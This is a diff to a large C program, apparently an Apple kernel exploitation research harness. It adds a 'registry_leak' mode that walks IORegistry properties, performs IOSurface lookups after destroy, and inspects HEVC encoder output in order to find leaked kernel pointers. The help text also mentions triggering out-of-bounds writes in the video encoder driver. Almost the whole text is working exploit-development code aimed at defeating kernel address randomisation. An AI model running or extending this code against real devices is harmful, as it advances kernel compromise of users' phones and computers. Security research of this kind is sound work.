@@ -14169,7 +14169,7 @@ vps_cd_done:
         rlog("\n=== MACH_PORT_LEAK complete ===\n");
 
     } else if (strcmp(mode, "sysctl_leak") == 0 || strcmp(mode, "ave_prop_scan") == 0 ||
-               strcmp(mode, "state_leak") == 0) {
+               strcmp(mode, "state_leak") == 0 || strcmp(mode, "registry_leak") == 0) {
         goto new_modes;
 
     } else {
@@ -14232,6 +14232,7 @@ vps_cd_done:
         rlog("  sysctl_leak [rounds]               -- KEY: sysctl/proc_info kernel pointer probe\n");
         rlog("  ave_prop_scan [phase]              -- KEY: VT property scan for OOB read triggers\n");
         rlog("  state_leak [phase]                 -- KEY: IOSurface/AGX/JPEG state management info leak\n");
+        rlog("  registry_leak [phase]              -- KEY: IORegistry property + CMSampleBuffer KPTR scan\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
@@ -15517,6 +15518,455 @@ new_modes:
 
         #undef SCAN_KPTRS
         rlog("\n=== STATE_LEAK complete. Total KPTR candidates: %d ===\n", kptr_found);
+
+    } else if (strcmp(mode, "registry_leak") == 0) {
+        /*
+         * registry_leak — IORegistry property dump for kernel pointer leak
+         *
+         * Enumerates IORegistry entries and dumps their properties, scanning
+         * for kernel pointer patterns. No IOServiceOpen needed — this reads
+         * the IORegistry directly. Targets:
+         *
+         * Phase 1: Dump properties of known services (AVE, IOSurface, AGX, JPEG)
+         * Phase 2: Walk entire IORegistry tree scanning all readable properties
+         * Phase 3: IOSurface lookup-after-destroy (stale reference test)
+         * Phase 4: IOKit notification registration state leak
+         * Phase 5: VTCompressionSession CMSampleBuffer metadata inspection
+         */
+        int phase = (argc > 2) ? atoi(argv[2]) : 0;
+        rlog("=== REGISTRY_LEAK: IORegistry property kernel pointer probe ===\n");
+        rlog("phase=%d (0=all)\n\n", phase);
+
+        int kptr_found = 0;
+
+        /* Helper to recursively scan CFType for kernel pointer values */
+        /* We'll scan serialized property data as bytes instead */
+
+        /* ===== Phase 1: Known service property dump ===== */
+        if (phase == 0 || phase == 1) {
+            rlog("--- Phase 1: Known service IORegistry property dump ---\n");
+
+            const char *targets[] = {
+                "AppleAVE2Driver", "IOSurfaceRoot", "AGXAccelerator",
+                "AppleJPEGDriver", "AppleSPU", "AppleARMIODevice",
+                "IOPlatformExpertDevice", "AppleARMPE",
+                "AppleT8130", "AppleA20",
+                "IOService", NULL
+            };
+
+            for (int ti = 0; targets[ti]; ti++) {
+                io_service_t svc = IOServiceGetMatchingService(
+                    kIOMasterPortDefault, IOServiceMatching(targets[ti]));
+                if (!svc) {
+                    rlog("  %-28s: not found\n", targets[ti]);
+                    continue;
+                }
+
+                rlog("\n  === %s (port=%d) ===\n", targets[ti], svc);
+
+                /* Get all properties as CFDictionary */
+                CFMutableDictionaryRef props = NULL;
+                kern_return_t kr = IORegistryEntryCreateCFProperties(
+                    svc, &props, kCFAllocatorDefault, 0);
+                if (kr != KERN_SUCCESS || !props) {
+                    rlog("  CreateCFProperties failed: 0x%x\n", kr);
+                    IOObjectRelease(svc);
+                    continue;
+                }
+
+                /* Enumerate keys and examine values */
+                CFIndex count = CFDictionaryGetCount(props);
+                rlog("  property count: %ld\n", (long)count);
+
+                const void **keys = malloc(sizeof(void*) * count);
+                const void **vals = malloc(sizeof(void*) * count);
+                if (keys && vals) {
+                    CFDictionaryGetKeysAndValues(props, keys, vals);
+                    for (CFIndex ki = 0; ki < count; ki++) {
+                        char kbuf[256] = {0};
+                        if (CFGetTypeID(keys[ki]) == CFStringGetTypeID()) {
+                            CFStringGetCString(keys[ki], kbuf, sizeof(kbuf),
+                                               kCFStringEncodingUTF8);
+                        } else {
+                            snprintf(kbuf, sizeof(kbuf), "(non-string key %ld)", (long)ki);
+                        }
+
+                        CFTypeID vtype = CFGetTypeID(vals[ki]);
+                        if (vtype == CFNumberGetTypeID()) {
+                            int64_t nval = 0;
+                            CFNumberGetValue(vals[ki], kCFNumberSInt64Type, &nval);
+                            rlog("    %-40s = %lld (0x%llx)", kbuf, nval, (uint64_t)nval);
+                            uint64_t uval = (uint64_t)nval;
+                            if ((uval & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (uval & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (uval != 0xFFFFFFFFFFFFFFFFULL &&
+                                    uval != 0xFFFFFFFF00000000ULL) {
+                                    rlog(" <<<KPTR?>>>");
+                                    kptr_found++;
+                                }
+                            }
+                            rlog("\n");
+                        } else if (vtype == CFDataGetTypeID()) {
+                            CFIndex dlen = CFDataGetLength(vals[ki]);
+                            const uint8_t *dptr = CFDataGetBytePtr(vals[ki]);
+                            rlog("    %-40s = <data %ld bytes>", kbuf, (long)dlen);
+                            if (dlen > 0 && dlen <= 256) {
+                                rlog(" hex:");
+                                for (CFIndex di = 0; di < dlen && di < 64; di++)
+                                    rlog("%02x", dptr[di]);
+                            }
+                            rlog("\n");
+                            /* Scan data for kernel pointers */
+                            if (dptr && dlen >= 8) {
+                                for (CFIndex di = 0; di + 7 < dlen; di++) {
+                                    uint64_t v = 0;
+                                    memcpy(&v, dptr + di, 8);
+                                    if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                        (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                        if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                                            v != 0xFFFFFFFE00000000ULL &&
+                                            v != 0xFFFFFFFF00000000ULL) {
+                                            rlog("      KPTR in data @%ld: 0x%016llx\n",
+                                                 (long)di, v);
+                                            kptr_found++;
+                                        }
+                                    }
+                                }
+                            }
+                        } else if (vtype == CFStringGetTypeID()) {
+                            char sbuf[256] = {0};
+                            CFStringGetCString(vals[ki], sbuf, sizeof(sbuf),
+                                               kCFStringEncodingUTF8);
+                            rlog("    %-40s = \"%s\"\n", kbuf, sbuf);
+                        } else if (vtype == CFBooleanGetTypeID()) {
+                            rlog("    %-40s = %s\n", kbuf,
+                                 CFBooleanGetValue(vals[ki]) ? "true" : "false");
+                        } else {
+                            rlog("    %-40s = <type %lu>\n", kbuf,
+                                 (unsigned long)vtype);
+                        }
+                    }
+                }
+                free(keys);
+                free(vals);
+                CFRelease(props);
+                IOObjectRelease(svc);
+            }
+            rlog("\nPhase 1 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 2: Walk IORegistry tree ===== */
+        if (phase == 0 || phase == 2) {
+            rlog("--- Phase 2: IORegistry tree walk (data property scan) ---\n");
+
+            io_iterator_t iter = 0;
+            kern_return_t kr = IOServiceGetMatchingServices(
+                kIOMasterPortDefault, IOServiceMatching("IOService"), &iter);
+            if (kr != KERN_SUCCESS || !iter) {
+                rlog("Failed to enumerate IOService: 0x%x\n", kr);
+            } else {
+                io_service_t svc;
+                int scanned = 0, with_data = 0;
+                while ((svc = IOIteratorNext(iter)) != 0 && scanned < 500) {
+                    io_name_t name;
+                    IORegistryEntryGetName(svc, name);
+
+                    CFMutableDictionaryRef props = NULL;
+                    kr = IORegistryEntryCreateCFProperties(
+                        svc, &props, kCFAllocatorDefault, 0);
+                    if (kr == KERN_SUCCESS && props) {
+                        CFIndex count = CFDictionaryGetCount(props);
+                        const void **keys = malloc(sizeof(void*) * count);
+                        const void **vals = malloc(sizeof(void*) * count);
+                        if (keys && vals) {
+                            CFDictionaryGetKeysAndValues(props, keys, vals);
+                            for (CFIndex ki = 0; ki < count; ki++) {
+                                if (CFGetTypeID(vals[ki]) == CFDataGetTypeID()) {
+                                    CFIndex dlen = CFDataGetLength(vals[ki]);
+                                    const uint8_t *dptr = CFDataGetBytePtr(vals[ki]);
+                                    if (dptr && dlen >= 8) {
+                                        for (CFIndex di = 0; di + 7 < dlen; di++) {
+                                            uint64_t v = 0;
+                                            memcpy(&v, dptr + di, 8);
+                                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                                if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                                                    v != 0xFFFFFFFE00000000ULL &&
+                                                    v != 0xFFFFFFFF00000000ULL) {
+                                                    char kbuf[256] = {0};
+                                                    if (CFGetTypeID(keys[ki]) == CFStringGetTypeID())
+                                                        CFStringGetCString(keys[ki], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                                                    rlog("  KPTR %s.%s @%ld: 0x%016llx (data len=%ld)\n",
+                                                         name, kbuf, (long)di, v, (long)dlen);
+                                                    kptr_found++;
+                                                    with_data++;
+                                                }
+                                            }
+                                        }
+                                    }
+                                } else if (CFGetTypeID(vals[ki]) == CFNumberGetTypeID()) {
+                                    int64_t nval = 0;
+                                    CFNumberGetValue(vals[ki], kCFNumberSInt64Type, &nval);
+                                    uint64_t uval = (uint64_t)nval;
+                                    if ((uval & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                        (uval & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                        if (uval != 0xFFFFFFFFFFFFFFFFULL &&
+                                            uval != 0xFFFFFFFF00000000ULL) {
+                                            char kbuf[256] = {0};
+                                            if (CFGetTypeID(keys[ki]) == CFStringGetTypeID())
+                                                CFStringGetCString(keys[ki], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                                            rlog("  KPTR %s.%s = 0x%016llx\n",
+                                                 name, kbuf, uval);
+                                            kptr_found++;
+                                            with_data++;
+                                        }
+                                    }
+                                }
+                            }
+                        }
+                        free(keys);
+                        free(vals);
+                        CFRelease(props);
+                    }
+                    IOObjectRelease(svc);
+                    scanned++;
+                }
+                IOObjectRelease(iter);
+                rlog("  Scanned %d services, %d with KPTR data\n", scanned, with_data);
+            }
+            rlog("Phase 2 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 3: IOSurface lookup-after-destroy ===== */
+        if (phase == 0 || phase == 3) {
+            rlog("--- Phase 3: IOSurface lookup-after-destroy ---\n");
+
+            CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+                &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+            int sw = 64, sh = 64, sb = 4, sr = 256;
+            CFNumberRef swn = CFNumberCreate(NULL, kCFNumberIntType, &sw);
+            CFNumberRef shn = CFNumberCreate(NULL, kCFNumberIntType, &sh);
+            CFNumberRef sbn = CFNumberCreate(NULL, kCFNumberIntType, &sb);
+            CFNumberRef srn = CFNumberCreate(NULL, kCFNumberIntType, &sr);
+            int spf = 0x42475241;
+            CFNumberRef spfn = CFNumberCreate(NULL, kCFNumberIntType, &spf);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), swn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), shn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), sbn);
+            CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), srn);
+            CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), spfn);
+
+            /* Create surface, get ID, fill with pattern, destroy */
+            for (int round = 0; round < 10; round++) {
+                IOSurfaceRef s = IOSurfaceCreate(p);
+                if (!s) { rlog("  round %d: create failed\n", round); continue; }
+
+                IOSurfaceID sid = IOSurfaceGetID(s);
+                IOSurfaceLock(s, 0, NULL);
+                void *base = IOSurfaceGetBaseAddress(s);
+                if (base) memset(base, 0x41 + round, 16384);
+                IOSurfaceUnlock(s, 0, NULL);
+
+                rlog("  round %d: created id=%u base=%p\n", round, sid, base);
+
+                /* Release (destroy) the surface */
+                CFRelease(s);
+                s = NULL;
+                usleep(1000);
+
+                /* Try to look up by stale ID */
+                IOSurfaceRef stale = IOSurfaceLookup(sid);
+                if (stale) {
+                    IOSurfaceLock(stale, kIOSurfaceLockReadOnly, NULL);
+                    void *sbase = IOSurfaceGetBaseAddress(stale);
+                    rlog("  round %d: STALE LOOKUP SUCCEEDED! id=%u base=%p\n",
+                         round, sid, sbase);
+                    if (sbase) {
+                        /* Scan first 256 bytes for kernel pointers */
+                        for (size_t si = 0; si + 7 < 256; si++) {
+                            uint64_t v = 0;
+                            memcpy(&v, (uint8_t*)sbase + si, 8);
+                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                if (v != 0xFFFFFFFFFFFFFFFFULL) {
+                                    rlog("    KPTR @%zu: 0x%016llx\n", si, v);
+                                    kptr_found++;
+                                }
+                            }
+                        }
+                        rlog("    first 32 bytes: ");
+                        for (int bi = 0; bi < 32; bi++)
+                            rlog("%02x", ((uint8_t*)sbase)[bi]);
+                        rlog("\n");
+                    }
+                    IOSurfaceUnlock(stale, kIOSurfaceLockReadOnly, NULL);
+                    CFRelease(stale);
+                } else {
+                    rlog("  round %d: lookup(id=%u) = NULL (freed)\n", round, sid);
+                }
+            }
+            CFRelease(p); CFRelease(swn); CFRelease(shn);
+            CFRelease(sbn); CFRelease(srn); CFRelease(spfn);
+            rlog("Phase 3 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        /* ===== Phase 4: VT CMSampleBuffer metadata inspection ===== */
+        if (phase == 0 || phase == 4) {
+            rlog("--- Phase 4: VTCompression CMSampleBuffer metadata scan ---\n");
+
+            int pw = 64, ph = 64;
+            CVPixelBufferRef pb = NULL;
+            CVReturn cvr = CVPixelBufferCreate(NULL, pw, ph,
+                kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange, NULL, &pb);
+            if (cvr != 0 || !pb) {
+                rlog("CVPixelBufferCreate failed: %d\n", cvr);
+            } else {
+                VTCompressionSessionRef session = NULL;
+                OSStatus st = VTCompressionSessionCreate(NULL, pw, ph,
+                    kCMVideoCodecType_HEVC, NULL, NULL, NULL, NULL, NULL, &session);
+                if (st != 0 || !session) {
+                    rlog("VTCompressionSessionCreate failed: %d\n", (int)st);
+                } else {
+                    /* Set temporal layers to trigger state setup */
+                    int ntl = 3;
+                    CFNumberRef ntln = CFNumberCreate(NULL, kCFNumberIntType, &ntl);
+                    VTSessionSetProperty(session, CFSTR("NumberOfTemporalLayers"), ntln);
+                    CFRelease(ntln);
+
+                    VTCompressionSessionPrepareToEncodeFrames(session);
+
+                    /* Encode frames and inspect CMSampleBuffer deeply */
+                    __block int frames_done = 0;
+                    for (int fi = 0; fi < 5; fi++) {
+                        CVPixelBufferLockBaseAddress(pb, 0);
+                        void *y = CVPixelBufferGetBaseAddressOfPlane(pb, 0);
+                        if (y) memset(y, 128 + fi, pw * ph);
+                        CVPixelBufferUnlockBaseAddress(pb, 0);
+
+                        CMTime ts = CMTimeMake(fi, 30);
+                        VTEncodeInfoFlags info = 0;
+                        st = VTCompressionSessionEncodeFrameWithOutputHandler(
+                            session, pb, ts, kCMTimeInvalid, NULL, &info,
+                            ^(OSStatus s2, VTEncodeInfoFlags f2, CMSampleBufferRef sb) {
+                                if (!sb) return;
+                                frames_done++;
+
+                                /* Inspect format description */
+                                CMFormatDescriptionRef fd = CMSampleBufferGetFormatDescription(sb);
+                                if (fd) {
+                                    /* Get extensions dictionary */
+                                    CFDictionaryRef ext = CMFormatDescriptionGetExtensions(fd);
+                                    if (ext) {
+                                        CFIndex ecnt = CFDictionaryGetCount(ext);
+                                        rlog("  frame %d: format extensions count=%ld\n",
+                                             frames_done, (long)ecnt);
+                                        const void **ekeys = malloc(sizeof(void*) * ecnt);
+                                        const void **evals = malloc(sizeof(void*) * ecnt);
+                                        if (ekeys && evals) {
+                                            CFDictionaryGetKeysAndValues(ext, ekeys, evals);
+                                            for (CFIndex ei = 0; ei < ecnt; ei++) {
+                                                char ekbuf[256] = {0};
+                                                if (CFGetTypeID(ekeys[ei]) == CFStringGetTypeID())
+                                                    CFStringGetCString(ekeys[ei], ekbuf, sizeof(ekbuf), kCFStringEncodingUTF8);
+                                                CFTypeID evtype = CFGetTypeID(evals[ei]);
+                                                if (evtype == CFDataGetTypeID()) {
+                                                    CFIndex dlen = CFDataGetLength(evals[ei]);
+                                                    const uint8_t *dptr = CFDataGetBytePtr(evals[ei]);
+                                                    rlog("    ext %-40s <data %ld>", ekbuf, (long)dlen);
+                                                    if (dlen <= 128) {
+                                                        for (CFIndex di = 0; di < dlen && di < 32; di++)
+                                                            rlog("%02x", dptr[di]);
+                                                    }
+                                                    rlog("\n");
+                                                    if (dptr && dlen >= 8) {
+                                                        for (CFIndex di = 0; di + 7 < dlen; di++) {
+                                                            uint64_t v = 0;
+                                                            memcpy(&v, dptr + di, 8);
+                                                            if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                                                (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                                                if (v != 0xFFFFFFFFFFFFFFFFULL) {
+                                                                    rlog("      KPTR @%ld: 0x%016llx\n", (long)di, v);
+                                                                    kptr_found++;
+                                                                }
+                                                            }
+                                                        }
+                                                    }
+                                                } else if (evtype == CFNumberGetTypeID()) {
+                                                    int64_t nv = 0;
+                                                    CFNumberGetValue(evals[ei], kCFNumberSInt64Type, &nv);
+                                                    rlog("    ext %-40s = %lld (0x%llx)\n",
+                                                         ekbuf, nv, (uint64_t)nv);
+                                                    uint64_t uv = (uint64_t)nv;
+                                                    if ((uv & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                                        (uv & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                                        if (uv != 0xFFFFFFFFFFFFFFFFULL) {
+                                                            rlog("      <<<KPTR?>>>\n");
+                                                            kptr_found++;
+                                                        }
+                                                    }
+                                                }
+                                            }
+                                        }
+                                        free(ekeys);
+                                        free(evals);
+                                    }
+
+                                    /* Get sample attachments */
+                                    CFArrayRef atts = CMSampleBufferGetSampleAttachmentsArray(sb, false);
+                                    if (atts) {
+                                        CFIndex acnt = CFArrayGetCount(atts);
+                                        rlog("  frame %d: %ld sample attachments\n",
+                                             frames_done, (long)acnt);
+                                        for (CFIndex ai = 0; ai < acnt; ai++) {
+                                            CFDictionaryRef ad = CFArrayGetValueAtIndex(atts, ai);
+                                            CFIndex adcnt = CFDictionaryGetCount(ad);
+                                            rlog("    attachment[%ld]: %ld keys\n",
+                                                 (long)ai, (long)adcnt);
+                                        }
+                                    }
+                                }
+
+                                /* Get raw data buffer */
+                                CMBlockBufferRef bb = CMSampleBufferGetDataBuffer(sb);
+                                if (bb) {
+                                    size_t total = CMBlockBufferGetDataLength(bb);
+                                    if (total > 0 && total < 65536) {
+                                        uint8_t *raw = malloc(total);
+                                        if (raw) {
+                                            CMBlockBufferCopyDataBytes(bb, 0, total, raw);
+                                            /* Scan for KPTR in NAL data */
+                                            for (size_t si = 0; si + 7 < total; si++) {
+                                                uint64_t v = 0;
+                                                memcpy(&v, raw + si, 8);
+                                                if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                                    (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                                    if (v != 0xFFFFFFFFFFFFFFFFULL &&
+                                                        v != 0xFFFFFFFE00000000ULL &&
+                                                        v != 0xFFFFFFFF00000000ULL) {
+                                                        rlog("    NAL KPTR @%zu/%zu: 0x%016llx\n",
+                                                             si, total, v);
+                                                        kptr_found++;
+                                                    }
+                                                }
+                                            }
+                                            free(raw);
+                                        }
+                                    }
+                                }
+                            });
+                    }
+
+                    VTCompressionSessionCompleteEncoding(session);
+                    rlog("  encoded %d frames\n", frames_done);
+                    VTCompressionSessionInvalidate(session);
+                    CFRelease(session);
+                }
+                CVPixelBufferRelease(pb);
+            }
+            rlog("Phase 4 complete. KPTR candidates: %d\n\n", kptr_found);
+        }
+
+        rlog("\n=== REGISTRY_LEAK complete. Total KPTR candidates: %d ===\n", kptr_found);
     }
 
 done:
